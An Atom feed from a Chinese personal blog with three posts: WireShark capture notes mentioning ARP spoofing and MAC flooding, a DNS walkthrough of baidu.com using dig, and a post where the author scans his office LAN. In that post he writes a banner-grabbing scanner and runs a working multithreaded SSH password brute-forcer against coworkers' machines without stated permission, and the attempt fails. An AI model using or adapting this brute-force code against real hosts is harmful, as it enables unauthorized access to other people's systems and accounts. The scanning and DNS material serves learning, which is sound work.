<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SkyRover</title>
  <subtitle>做我的仲夏夜之梦～</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://microndgt.github.io/"/>
  <updated>2017-02-21T09:34:10.000Z</updated>
  <id>http://microndgt.github.io/</id>
  
  <author>
    <name>Kevin</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WireShark 抓包</title>
    <link href="http://microndgt.github.io/2017/02/21/WireShark-%E6%8A%93%E5%8C%85/"/>
    <id>http://microndgt.github.io/2017/02/21/WireShark-抓包/</id>
    <published>2017-02-21T04:05:10.000Z</published>
    <updated>2017-02-21T09:34:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="抓包原理"><a href="#抓包原理" class="headerlink" title="抓包原理"></a>抓包原理</h1><h2 id="网络原理"><a href="#网络原理" class="headerlink" title="网络原理"></a>网络原理</h2><h3 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h3><p>直接抓包本机网卡进出流量</p>
<h3 id="集线器环境"><a href="#集线器环境" class="headerlink" title="集线器环境"></a>集线器环境</h3><p>物理层，流量防洪，统一冲突域</p>
<h3 id="交换机环境"><a href="#交换机环境" class="headerlink" title="交换机环境"></a>交换机环境</h3><p>网络层产品，所以使用路由表或者Mac地址来通信的</p>
<p><strong>端口镜像SPAN</strong></p>
<p>将交换机流量copy过来，设置混杂模式，网络监控</p>
<p><strong>ARP欺骗</strong></p>
<p><code>Cain&amp;Abel</code> ARP攻击软件，ARP请求，广播，ARP回复，ARP欺骗。ARP表，后到优先，改掉了交换机的MAC表。最后决定是否将流量转出来。局域网攻击。</p>
<p><strong>MAC泛洪</strong></p>
<p>攻击交换机中抓包，泛洪垃圾包，产生大量的MAC地址，交换机的表会被爆表，如果没有MAC地址，会对外放洪。</p>
<h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><ul>
<li>GTK 1/2 图形化处理界面</li>
<li>Core</li>
<li>Wiretap 格式支持引擎</li>
<li>Capture 抓包引擎</li>
<li>Win-/libpcap</li>
</ul>
<h2 id="快速抓包"><a href="#快速抓包" class="headerlink" title="快速抓包"></a>快速抓包</h2><ul>
<li>选择网卡</li>
<li>停止抓包</li>
<li>保存数据包</li>
</ul>
<p>RTT 往返时延<br>TTL TTL的作用是限制IP数据包在计算机网络中的存在的时间</p>
<h2 id="名字解析"><a href="#名字解析" class="headerlink" title="名字解析"></a>名字解析</h2><ul>
<li>Mac地址解析</li>
<li>IP地址解析，网络名字解析</li>
<li>传输名字解析</li>
</ul>
<h2 id="数据包操作"><a href="#数据包操作" class="headerlink" title="数据包操作"></a>数据包操作</h2><ul>
<li>标记数据包，标记，配色方案</li>
<li>注释数据包</li>
<li>合并数据包</li>
<li>打印数据包</li>
<li>输出数据包</li>
</ul>
<h2 id="抓包选项设置"><a href="#抓包选项设置" class="headerlink" title="抓包选项设置"></a>抓包选项设置</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;抓包原理&quot;&gt;&lt;a href=&quot;#抓包原理&quot; class=&quot;headerlink&quot; title=&quot;抓包原理&quot;&gt;&lt;/a&gt;抓包原理&lt;/h1&gt;&lt;h2 id=&quot;网络原理&quot;&gt;&lt;a href=&quot;#网络原理&quot; class=&quot;headerlink&quot; title=&quot;网络原理&quot;&gt;&lt;/a
    
    </summary>
    
      <category term="计算机网络" scheme="http://microndgt.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
      <category term="WireShark" scheme="http://microndgt.github.io/tags/WireShark/"/>
    
  </entry>
  
  <entry>
    <title>网络探险记1</title>
    <link href="http://microndgt.github.io/2017/02/20/%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%99%A9%E8%AE%B01/"/>
    <id>http://microndgt.github.io/2017/02/20/网络探险记1/</id>
    <published>2017-02-20T08:52:29.000Z</published>
    <updated>2017-02-20T12:06:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈</p>
<p>最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以探险的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。</p>
<p>第一步查看下局域网中有哪些打开的端口，祭上大杀器NMAP扫描器！</p>
<h1 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h1><p>使用客户端也行，命令行也行，命令：<code>nmap -p 1-65535 -T4 -A -v 192.168.0.*</code>，这里只检测TCP连接。检测很快就有结果了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Initiating SYN Stealth Scan at 16:28</div><div class="line">Scanning 8 hosts [65535 ports/host]</div><div class="line">Discovered open port 445/tcp on 192.168.0.104</div><div class="line">Discovered open port 8888/tcp on 192.168.0.101</div><div class="line">Discovered open port 8080/tcp on 192.168.0.112</div><div class="line">Discovered open port 3306/tcp on 192.168.0.117</div><div class="line">Discovered open port 22/tcp on 192.168.0.117</div><div class="line">Discovered open port 80/tcp on 192.168.0.1</div><div class="line">Discovered open port 135/tcp on 192.168.0.104</div><div class="line">Discovered open port 139/tcp on 192.168.0.104</div><div class="line">SYN Stealth Scan Timing: About 0.57% done</div></pre></td></tr></table></figure>
<p>这里的端口逐一介绍下：</p>
<ul>
<li>445端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，估计是公司的可联网打印机，常用入侵端口</li>
<li>8888端口，这个是和我合作的前端妹纸的电脑开的，是测试前端程序呢，不打搅啦</li>
<li>8080端口，这个我发送了个GET请求 <code>/index</code>，返回了官网数据，看来是一个web服务器</li>
<li>3306端口，这个是MySQL的默认端口，常用入侵端口</li>
<li>22端口，ssh端口,可以用于登录</li>
<li>80端口，是为HTTP开放的,连路由器用的</li>
<li>135端口，Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。常用入侵端口</li>
<li>139端口，NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。常用入侵端口</li>
</ul>
<p>这个<code>192.168.0.104</code>开了这么多易入侵端口，就不怕吗？我发现断了打印机的电，仍然有这个IP的存在，看来不是打印机，那会是哪台主机这么随便？</p>
<h1 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h1><p>这里写了一个漏洞扫描器，也就是向每个IP，每个可能的端口发送连接请求，查看返回的banner</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">def retBanner(ip, port):</div><div class="line">    try:</div><div class="line">        socket.setdefaulttimeout(2)</div><div class="line">        s = socket.socket()</div><div class="line">        s.connect((ip, port))</div><div class="line">        # 连接后的返回值</div><div class="line">        banner = s.recv(1024)</div><div class="line">        return banner</div><div class="line">    except:</div><div class="line">        return</div><div class="line">def checkVulns(banners, filename):</div><div class="line">    &apos;&apos;&apos;检查是否是漏洞，检查列表从文件读取&apos;&apos;&apos;</div><div class="line">    f = open(filename, &apos;r&apos;)</div><div class="line">    for line in f.readlines():</div><div class="line">        if line.strip(&apos;\n&apos;) in banners:</div><div class="line">            print(&apos;server is vulnerable:&apos; + banners.strip(&apos;\n&apos;))</div><div class="line">def main():</div><div class="line">    &apos;&apos;&apos;执行的主函数&apos;&apos;&apos;</div><div class="line">    portList = [21, 22, 25, 80, 110, 443]</div><div class="line">    for x in range(100, 150):</div><div class="line">        ip = &apos;192.168.0.&apos; + str(x)</div><div class="line">        for port in portList:</div><div class="line">            print(&quot;ip:&quot;, ip, &quot; port:&quot;, port)</div><div class="line">            banner = retBanner(ip, port)</div><div class="line">            # 如果存在返回值</div><div class="line">            if banner:</div><div class="line">                print(ip + &quot;: &quot; + banner.decode(&apos;utf-8&apos;))</div><div class="line">                # checkVulns(banner, filename)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>最后结果发现有这么几台主机开了ssh服务，可以进行远程登录，但是都需要密码，所以只好暴力猜解咯。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ip: 192.168.0.117  port: 22</div><div class="line">192.168.0.117: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.117  port: 25</div><div class="line">ip: 192.168.0.117  port: 80</div><div class="line">ip: 192.168.0.117  port: 110</div><div class="line">ip: 192.168.0.117  port: 443</div><div class="line">ip: 192.168.0.118  port: 21</div><div class="line">ip: 192.168.0.118  port: 22</div><div class="line">192.168.0.118: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.118  port: 25</div><div class="line">ip: 192.168.0.118  port: 80</div><div class="line">ip: 192.168.0.118  port: 110</div><div class="line">ip: 192.168.0.118  port: 443</div><div class="line">ip: 192.168.0.119  port: 21</div><div class="line">ip: 192.168.0.119  port: 22</div><div class="line">192.168.0.119: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.119  port: 25</div></pre></td></tr></table></figure>
<h1 id="ssh登录暴力猜解"><a href="#ssh登录暴力猜解" class="headerlink" title="ssh登录暴力猜解"></a>ssh登录暴力猜解</h1><h2 id="破解字典"><a href="#破解字典" class="headerlink" title="破解字典"></a>破解字典</h2><p>一个黑客能不能破解密码，主要看他的字典大不大= =</p>
<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>这里是一个暴力猜解程序，使用了多线程，密码就用<code>19800101</code>以来的生日值做测试，所以大家以后不要用生日来做密码啦，很容易被破解的。</p>
<p>使用了<code>pexpect</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line"># 安装pxssh包</div><div class="line"># wget http://pexpect.sourceforge.net/pexpect-2.3.tar.gz</div><div class="line"># tar -xzf pexpect-2.3.tar.gz</div><div class="line"># cd pexpect-2.3</div><div class="line"># sudo python setup.py install</div><div class="line">import pexpect.pxssh as pxssh</div><div class="line">import optparse</div><div class="line">import time</div><div class="line">from threading import *</div><div class="line">maxConnections = 5</div><div class="line"># 相当于可用资源数acquire -1 release +1 然后release会检查上限</div><div class="line">connection_lock = BoundedSemaphore(value=maxConnections)</div><div class="line">Found = False</div><div class="line">Fails = 0</div><div class="line"># pxssh可以用预先写好的login(),logout()和prompt()等函数直接与ssh交互</div><div class="line">def connect(host, user, password, release):</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    try:</div><div class="line">        s = pxssh.pxssh()</div><div class="line">        s.login(host, user, password)</div><div class="line">        # 如果登陆成功说明找到密码</div><div class="line">        print(&apos;[+] Password Found:&apos; + password)</div><div class="line">        Found = True</div><div class="line">    except Exception as e:</div><div class="line">        # 说明ssh服务器被大量连接刷爆了</div><div class="line">        if &apos;read_nonblocking&apos; in str(e):</div><div class="line">            Fails += 1</div><div class="line">            time.sleep(5)</div><div class="line">            connect(host, user, password, False)</div><div class="line">            # 提示符提取困难</div><div class="line">        elif &apos;synchronize with original prompt&apos; in str(e):</div><div class="line">            time.sleep(1)</div><div class="line">            connect(host, user, password, False)</div><div class="line">    finally:</div><div class="line">        if release:</div><div class="line">            connection_lock.release()</div><div class="line">def main():</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    # 一个命令行解析</div><div class="line">    parser = optparse.OptionParser(&apos;usage%prog -H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&apos;)</div><div class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</div><div class="line">    parser.add_option(&apos;-F&apos;, dest=&apos;passwordFile&apos;, type=&apos;string&apos;, help=&apos;specify password file&apos;)</div><div class="line">    parser.add_option(&apos;-u&apos;, dest=&apos;user&apos;, type=&apos;string&apos;, help=&apos;specify the user&apos;)</div><div class="line">    # 定义完所有参数之后开始解析传入的参数</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    # options包含所有参数</div><div class="line">    host = options.tgtHost</div><div class="line">    passwordFile = options.passwordFile</div><div class="line">    user = options.user</div><div class="line">    if host == None or passwordFile == None or user == None:</div><div class="line">        print(parser.usage)</div><div class="line">        exit(0)</div><div class="line">    fn = open(passwordFile, &apos;r&apos;)</div><div class="line">    for line in fn.readlines():</div><div class="line">        if Found:</div><div class="line">            print(&quot;Password Found&quot;)</div><div class="line">            exit(0)</div><div class="line">        if Fails &gt; 5:</div><div class="line">            print(&quot;too many socket timeouts&quot;)</div><div class="line">            exit(0)</div><div class="line">        connection_lock.acquire()</div><div class="line">        password = line.strip(&apos;\r&apos;).strip(&apos;\n&apos;)</div><div class="line">        print(&quot;Testing:&quot; + str(password))</div><div class="line">        t = Thread(target=connect, args=(host, user, password, True))</div><div class="line">        t.start()</div><div class="line">        # time.sleep(0.1)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>破解中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Testing:19940629</div><div class="line">Testing:19940630</div><div class="line">Testing:19940701</div><div class="line">Testing:19940702</div><div class="line">Testing:19940703</div></pre></td></tr></table></figure>
<p>然并卵，破解失败。。。看来这个主机的主人机智的没有使用生日做密码。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈&lt;/p&gt;
&lt;p&gt;最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以探险的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。&lt;/
    
    </summary>
    
      <category term="黑客" scheme="http://microndgt.github.io/categories/%E9%BB%91%E5%AE%A2/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="黑客" scheme="http://microndgt.github.io/tags/%E9%BB%91%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>BAIDU的DNS解析</title>
    <link href="http://microndgt.github.io/2017/02/19/BAIDU%E7%9A%84DNS%E8%A7%A3%E6%9E%90/"/>
    <id>http://microndgt.github.io/2017/02/19/BAIDU的DNS解析/</id>
    <published>2017-02-19T09:31:18.000Z</published>
    <updated>2017-02-20T02:35:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天用<code>nslookup</code>命令解析查看了<code>www.baidu.com</code>的IP地址，却意外发现百度的<code>CNAME</code>居然是<code>www.a.shifen.com</code></p>
<h1 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">nslookup www.baidu.com</div><div class="line">&gt;&gt;&gt;</div><div class="line">Server:		119.29.29.29</div><div class="line">Address:	119.29.29.29#53</div><div class="line"></div><div class="line">Non-authoritative answer:</div><div class="line">www.baidu.com	canonical name = www.a.shifen.com.</div><div class="line">Name:	www.a.shifen.com</div><div class="line">Address: 220.181.111.188</div><div class="line">Name:	www.a.shifen.com</div><div class="line">Address: 220.181.112.244</div></pre></td></tr></table></figure>
<p>接下来看看一个详细的baidu的dns解析过程</p>
<p>理论上，目前我的电脑通过ISP接入互联网，ISP就会分配一个本地DNS服务器（非权威服务器），然后我的电脑向这个ISP DNS服务器发起请求，查询<code>www.baidu.com</code>的IP地址。</p>
<p>首先DNS会检查自己的缓存里面有没有这个地址，如果有的话直接返回，没有的话，ISP会把请求发送给根DNS服务器（13台），然后根DNS服务器发现是<code>.com</code>结尾，是<code>.com</code>这个顶级域名下的，就告诉请求者负责解析<code>.com</code>的DNS服务器，ISP DNS再次向baidu.com这个域的权威服务器发起请求，服务器收到之后，查一下www这台主机，然后把IP返回给IPS DNS，然后把地址返回给PC，并且存入缓存中，以便再次访问。</p>
<p>使用dig命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">+trace 表示将显示从根域逐级查询的过程，追踪dns解析中的问题</div><div class="line">+tcp dig默认使用udp协议，使用tcp方式</div></pre></td></tr></table></figure>
<p><code>dig www.baidu.com</code>的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">kevin:~ $ dig www.baidu.com</div><div class="line"># 版本信息和全局设置选项</div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; www.baidu.com</div><div class="line">;; global options: +cmd</div><div class="line"># DNS返回的技术信息</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 20158</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0</div><div class="line"># 问题，查询的名字和类型字段，A记录</div><div class="line">;; QUESTION SECTION:</div><div class="line">;www.baidu.com.			IN	A</div><div class="line"># 回答，对查询的响应中的RR</div><div class="line">;; ANSWER SECTION:</div><div class="line">www.baidu.com.		1014	IN	CNAME	www.a.shifen.com.</div><div class="line">www.a.shifen.com.	114	IN	A	220.181.111.188</div><div class="line">www.a.shifen.com.	114	IN	A	220.181.112.244</div><div class="line"># 查询的统计数据</div><div class="line">;; Query time: 60 msec</div><div class="line">;; SERVER: 119.29.29.29#53(119.29.29.29)</div><div class="line">;; WHEN: Sun Feb 19 15:07:00 2017</div><div class="line">;; MSG SIZE  rcvd: 90</div></pre></td></tr></table></figure>
<p>然后使用trace功能，从头显示dns解析过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">kevin@duguangtingdeMacBook-Pro:~ $ dig +trace www.baidu.com</div><div class="line"># 查询根DNS服务器</div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; +trace www.baidu.com</div><div class="line">;; global options: +cmd</div><div class="line">.			335103	IN	NS	m.root-servers.net.</div><div class="line">.			335103	IN	NS	a.root-servers.net.</div><div class="line">.			335103	IN	NS	j.root-servers.net.</div><div class="line">.			335103	IN	NS	e.root-servers.net.</div><div class="line">.			335103	IN	NS	c.root-servers.net.</div><div class="line">.			335103	IN	NS	i.root-servers.net.</div><div class="line">.			335103	IN	NS	b.root-servers.net.</div><div class="line">.			335103	IN	NS	g.root-servers.net.</div><div class="line">.			335103	IN	NS	h.root-servers.net.</div><div class="line">.			335103	IN	NS	k.root-servers.net.</div><div class="line">.			335103	IN	NS	l.root-servers.net.</div><div class="line">.			335103	IN	NS	d.root-servers.net.</div><div class="line">.			335103	IN	NS	f.root-servers.net.</div><div class="line">;; Received 228 bytes from 119.29.29.29#53(119.29.29.29) in 3126 ms</div><div class="line"># 查询到的com顶级域dns服务器</div><div class="line">com.			172800	IN	NS	e.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	b.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	j.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	m.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	i.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	f.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	a.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	g.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	h.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	l.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	k.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	c.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	d.gtld-servers.net.</div><div class="line">;; Received 503 bytes from 198.41.0.4#53(198.41.0.4) in 5139 ms</div><div class="line"># 查询到的baidu.com权威dns服务器</div><div class="line">baidu.com.		172800	IN	NS	dns.baidu.com.</div><div class="line">baidu.com.		172800	IN	NS	ns2.baidu.com.</div><div class="line">baidu.com.		172800	IN	NS	ns3.baidu.com.</div><div class="line">baidu.com.		172800	IN	NS	ns4.baidu.com.</div><div class="line">baidu.com.		172800	IN	NS	ns7.baidu.com.</div><div class="line">;; Received 201 bytes from 192.52.178.30#53(192.52.178.30) in 1697 ms</div><div class="line"># 查询到的别名</div><div class="line">www.baidu.com.		1200	IN	CNAME	www.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns1.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns3.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns5.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns4.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns2.a.shifen.com.</div><div class="line">;; Received 228 bytes from 61.135.165.235#53(61.135.165.235) in 123 ms</div></pre></td></tr></table></figure>
<p>首先获取13个根服务器的13个IP和主机名，然后向其中一个<code>198.41.0.4</code>发送<code>www.baidu.com</code>请求，返回<code>.com</code>顶级域的服务器IP，接着向<code>.com</code>域的一台服务器<code>192.52.178.30</code>请求，返回<code>baidu.com</code>域名服务器IP和名称，向百度的顶级域名服务器<code>dns.baidu.com</code>请求<code>www.baidu.com</code>，他发现这个www有别名叫<code>www.a.shifen.com</code>。</p>
<p>一般来讲，dns请求到别名的时候，查询就会终止，然后重新发起查询别名的请求，所以应该返回<code>www.a.shifen.com</code>，但是其实它返回了<code>a.shifen.com</code>的NS</p>
<p>再使用dig工具来查询一下<code>shifen.com</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">kevin@duguangtingdeMacBook-Pro:~ $ dig +trace shifen.com</div><div class="line"># 查询的根DNS服务器</div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; +trace shifen.com</div><div class="line">;; global options: +cmd</div><div class="line">.			188674	IN	NS	a.root-servers.net.</div><div class="line">.			188674	IN	NS	b.root-servers.net.</div><div class="line">.			188674	IN	NS	h.root-servers.net.</div><div class="line">.			188674	IN	NS	d.root-servers.net.</div><div class="line">.			188674	IN	NS	g.root-servers.net.</div><div class="line">.			188674	IN	NS	l.root-servers.net.</div><div class="line">.			188674	IN	NS	m.root-servers.net.</div><div class="line">.			188674	IN	NS	f.root-servers.net.</div><div class="line">.			188674	IN	NS	j.root-servers.net.</div><div class="line">.			188674	IN	NS	c.root-servers.net.</div><div class="line">.			188674	IN	NS	i.root-servers.net.</div><div class="line">.			188674	IN	NS	e.root-servers.net.</div><div class="line">.			188674	IN	NS	k.root-servers.net.</div><div class="line">;; Received 228 bytes from 119.29.29.29#53(119.29.29.29) in 1573 ms</div><div class="line"># com顶级域dns服务器</div><div class="line">com.			172800	IN	NS	g.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	a.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	c.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	f.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	e.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	l.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	m.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	i.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	b.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	j.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	h.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	d.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	k.gtld-servers.net.</div><div class="line">;; Received 488 bytes from 192.33.4.12#53(192.33.4.12) in 2454 ms</div><div class="line"># shifen.com 权威dns服务器</div><div class="line">shifen.com.		172800	IN	NS	dns.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns2.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns3.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns4.baidu.com.</div><div class="line">;; Received 170 bytes from 192.33.14.30#53(192.33.14.30) in 430 ms</div><div class="line"># 最终的A记录和NS记录</div><div class="line">shifen.com.		7200	IN	A	202.108.250.218</div><div class="line">shifen.com.		86400	IN	NS	ns4.baidu.com.</div><div class="line">shifen.com.		86400	IN	NS	ns3.baidu.com.</div><div class="line">shifen.com.		86400	IN	NS	ns2.baidu.com.</div><div class="line">shifen.com.		86400	IN	NS	ns1.baidu.com.</div><div class="line">;; Received 186 bytes from 61.135.165.235#53(61.135.165.235) in 24 ms</div></pre></td></tr></table></figure>
